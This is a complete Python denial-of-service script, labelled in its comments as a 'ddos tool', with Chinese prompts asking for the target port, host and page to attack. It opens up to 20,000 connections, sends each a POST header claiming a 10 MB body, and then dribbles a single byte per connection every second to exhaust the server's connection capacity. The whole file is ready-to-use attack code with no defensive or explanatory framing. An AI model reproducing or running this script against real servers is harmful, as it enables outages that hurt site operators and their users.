#!/usr/bin/env python
import socket
import time
import threading
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=20000
PORT=int(input('端口：'))
HOST=input('IP/域名：')
PAGE=input('攻击页面：')
print('正在攻击%s，可以在上一句代码修改' % PAGE)
#---------------------------
 
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
 
socks=[]
 
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            print ("Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print ("Could not connect to server or send error:%s"%ex)
#end def
 
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
                #print "send OK!"
            except Exception as ex:
                print ("Send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
        time.sleep(1)
#end def
 
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
 
conn_th.start()
send_th.start()
